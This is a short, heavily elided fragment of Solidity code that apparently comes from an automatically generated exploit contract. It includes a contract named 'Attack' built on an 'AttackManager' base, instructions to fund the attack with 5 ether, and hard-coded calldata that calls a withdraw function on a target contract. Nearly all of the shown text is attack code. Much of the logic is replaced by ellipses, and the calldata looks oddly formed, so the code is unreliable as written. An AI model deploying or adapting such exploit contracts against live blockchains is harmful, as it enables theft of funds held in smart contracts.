 ...
 * parameter. Make sure to send at least 5 ether and 0 wei to the attack
 ...
 * gas limit: 0
 * difficulty: 0
 * initial balance: 0x4563918244f40000 wei
 *
 */
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 4) {
                ...
                input: { uint(108278179835991),  }
 
                 */
                bytes memory data = bytes(hex"2e1a7d4d0000000000000000000000000000000000000000000000000000627a7a723057");
                uint value = 0x0;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x4563918244f40000; /* equals 5 ether and 0 wei */
    uint constant INITIAL_ETHER = 0x4563918244f40000;
